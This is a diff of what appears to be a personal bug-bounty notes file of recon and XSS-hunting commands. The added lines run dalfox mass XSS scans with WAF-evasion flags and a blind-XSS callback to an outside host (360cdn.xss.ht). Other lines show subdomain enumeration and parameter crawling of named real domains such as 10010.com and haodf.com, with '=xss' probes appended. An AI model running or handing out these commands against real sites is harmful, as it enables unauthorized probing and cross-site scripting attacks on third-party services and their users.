@@ -165,7 +165,7 @@ cat output/baidu.txt | deduplicate --hide-images --sort | sed '1,4d'|httpx -stat
 
 cat src.txt| xargs -I {} python3 paramspider.py --domain {}  -s TRUE -e js,css,woff,ttf,svg,png,gif,jpg,PNG --output ./src/{}.txt
 
-cat src.txt| xargs -I {} python3 paramspider.py --domain {}  -s TRUE -e 3g2,3gp,7z,aac,abw,aif,aifc,aiff,arc,au,avi,azw,bin,bmp,bz,bz2,cmx,cod,csh,css,csv,doc,docx,eot,epub,gif,gz,ico,ics,ief,jar,jfif,jpe,jpeg,jpg,m3u,mid,midi,mjs,mp2,mp3,mpa,mpe,mpeg,mpg,mpkg,mpp,mpv2,odp,ods,odt,oga,ogv,ogx,otf,pbm,pdf,pgm,png,pnm,ppm,ppt,pptx,ra,ram,rar,ras,rgb,rmi,rtf,snd,svg,swf,tar,tif,tiff,ttf,vsd,wav,weba,webm,webp,woff,woff2,xbm,xls,xlsx,xpm,xul,xwd,zip,zip --output ./src/{}.txt
+cat src.txt| xargs -I {} python3 paramspider.py --domain {}  -s TRUE -e 3g2,3gp,7z,aac,abw,aif,aifc,aiff,arc,au,avi,azw,bin,bmp,bz,bz2,cmx,cod,csh,css,csv,doc,docx,eot,epub,gif,gz,ico,ics,ief,jar,jfif,jpe,jpeg,jpg,m3u,mid,midi,mjs,mp2,mp3,mpa,mpe,mpeg,mpg,mpkg,mpp,mpv2,odp,ods,odt,oga,ogv,ogx,otf,pbm,pdf,pgm,png,pnm,ppm,ppt,pptx,ra,ram,rar,ras,rgb,rmi,rtf,snd,svg,swf,tar,tif,tiff,ttf,vsd,wav,weba,webm,webp,woff,woff2,xbm,xls,xlsx,xpm,xul,xwd,zip,zip,apk --output ./src/{}.txt
 
 cat all_jd_sub_domain.txt|deduplicate|httpx -status-code -mc 200,301 -silent| awk '{print $1}' > 200_sub_jd.txt
 
@@ -179,6 +179,11 @@ dalfox pipe --mass-worker 50 -b 360cdn.xss.ht  -o final_xss.txt
 dalfox file all_url.txt --mass-worker 50 -b 360cdn.xss.ht  --deep-domxss   -o final_xss.txt
 dalfox file all_url.txt --mass-worker 50 -b 360cdn.xss.ht  -o final_xss.txt
 
+dalfox  file 1.txt -S --mining-dict --only-discovery --timeout 2 --waf-evasion --mass-worker 100 -b 360cdn.xss.ht  -o final_xss_4.txt
+
+dalfox  file 1.txt --silence  --skip-mining-all  --timeout 2 --waf-evasion --mass-worker 100 -b 360cdn.xss.ht  -o final_xss_4.txt
+
+# Test notifier
 
 1.subfinder -d 10010.com | httpx | tee 10010.txt
 2.echo "http://m.client.10010.com" | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars";done | tee 10010.out
@@ -198,4 +203,4 @@ gospider -s "https://passport.haodf.com/" --cookie "" -o output -c 10 -d 1 --bla
 
 ## XSS相关的网站
 
-比较安全:`https://xsshunter.com/`
+比较安全:`https://xsshunter.com/` e
